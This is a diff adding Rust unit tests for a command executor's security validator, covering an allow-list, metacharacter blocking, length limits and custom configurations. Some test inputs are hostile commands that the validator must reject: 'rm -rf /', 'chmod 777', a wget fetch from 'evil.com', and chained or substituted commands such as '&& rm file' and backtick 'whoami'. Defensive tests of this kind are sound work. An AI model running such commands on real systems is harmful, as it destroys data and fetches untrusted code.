@@ -362,3 +362,125 @@ impl CommandExecutor {
         Ok(stdout.trim().to_string())
     }
 }
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::collections::HashSet;
+
+    #[test]
+    fn test_command_security_config_default() {
+        let config = CommandSecurityConfig::default();
+
+        // Verify secure defaults
+        assert!(!config.allow_shell_metacharacters);
+        assert_eq!(config.max_command_length, 1000);
+        assert_eq!(config.timeout_seconds, 30);
+
+        // Verify safe commands are whitelisted
+        assert!(config.allowed_commands.contains("echo"));
+        assert!(config.allowed_commands.contains("cat"));
+        assert!(config.allowed_commands.contains("ls"));
+        assert!(config.allowed_commands.contains("pwd"));
+
+        // Verify dangerous commands are not whitelisted
+        assert!(!config.allowed_commands.contains("rm"));
+        assert!(!config.allowed_commands.contains("sudo"));
+        assert!(!config.allowed_commands.contains("chmod"));
+    }
+
+    #[test]
+    fn test_validate_command_security_allowed_commands() {
+        let config = CommandSecurityConfig::default();
+
+        // Test allowed commands
+        assert!(CommandExecutor::validate_command_security("echo hello", &config).is_ok());
+        assert!(CommandExecutor::validate_command_security("cat file.txt", &config).is_ok());
+        assert!(CommandExecutor::validate_command_security("ls -la", &config).is_ok());
+        assert!(CommandExecutor::validate_command_security("pwd", &config).is_ok());
+    }
+
+    #[test]
+    fn test_validate_command_security_blocked_commands() {
+        let config = CommandSecurityConfig::default();
+
+        // Test blocked commands
+        assert!(CommandExecutor::validate_command_security("rm -rf /", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("sudo rm file", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("chmod 777 file", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("wget http://evil.com", &config).is_err());
+    }
+
+    #[test]
+    fn test_validate_command_security_dangerous_characters() {
+        let config = CommandSecurityConfig::default();
+
+        // Test dangerous shell metacharacters
+        assert!(CommandExecutor::validate_command_security("echo hello | cat", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello && rm file", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello; rm file", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo `whoami`", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo $HOME", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello > file", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello < file", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello*", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello?", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello[abc]", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo hello{a,b}", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("echo (hello)", &config).is_err());
+    }
+
+    #[test]
+    fn test_validate_command_security_length_limit() {
+        let config = CommandSecurityConfig::default();
+
+        // Test command length limits
+        let long_command = format!("echo {}", "a".repeat(1000));
+        assert!(CommandExecutor::validate_command_security(&long_command, &config).is_err());
+
+        let acceptable_command = format!("echo {}", "a".repeat(100));
+        assert!(CommandExecutor::validate_command_security(&acceptable_command, &config).is_ok());
+    }
+
+    #[test]
+    fn test_validate_command_security_empty_command() {
+        let config = CommandSecurityConfig::default();
+
+        // Test empty command
+        assert!(CommandExecutor::validate_command_security("", &config).is_err());
+        assert!(CommandExecutor::validate_command_security("   ", &config).is_err());
+    }
+
+    #[test]
+    fn test_validate_command_security_with_metacharacters_allowed() {
+        let mut config = CommandSecurityConfig::default();
+        config.allow_shell_metacharacters = true;
+
+        // Test that metacharacters are allowed when configured
+        assert!(CommandExecutor::validate_command_security("echo hello | cat", &config).is_ok());
+        assert!(CommandExecutor::validate_command_security("echo hello && echo world", &config).is_ok());
+
+        // But blocked commands should still be blocked
+        assert!(CommandExecutor::validate_command_security("rm -rf /", &config).is_err());
+    }
+
+    #[test]
+    fn test_command_security_config_custom() {
+        let mut allowed_commands = HashSet::new();
+        allowed_commands.insert("custom_command".to_string());
+
+        let config = CommandSecurityConfig {
+            allowed_commands,
+            max_command_length: 500,
+            allow_shell_metacharacters: true,
+            timeout_seconds: 60,
+        };
+
+        // Test custom configuration
+        assert!(CommandExecutor::validate_command_security("custom_command arg", &config).is_ok());
+        assert!(CommandExecutor::validate_command_security("echo hello", &config).is_err()); // Not in custom whitelist
+
+        let long_command = format!("custom_command {}", "a".repeat(500));
+        assert!(CommandExecutor::validate_command_security(&long_command, &config).is_err());
+    }
+}
